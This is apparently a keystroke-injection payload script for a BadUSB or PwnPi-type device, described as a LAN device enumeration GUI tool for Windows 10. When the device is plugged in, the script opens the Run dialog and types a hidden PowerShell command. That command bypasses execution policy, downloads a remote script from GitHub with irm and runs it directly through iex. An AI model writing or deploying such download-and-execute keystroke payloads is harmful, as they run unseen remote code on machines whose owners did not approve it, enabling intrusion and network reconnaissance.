// Title: beigeworm's LAN Device Enumeration GUI Tool.
// Author: @beigeworm
// Description: This script creates a GUI for enumerating devices on the local network.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Network-Enumeration-GUI/main.ps1 | iex");
delay(500);
press("ENTER");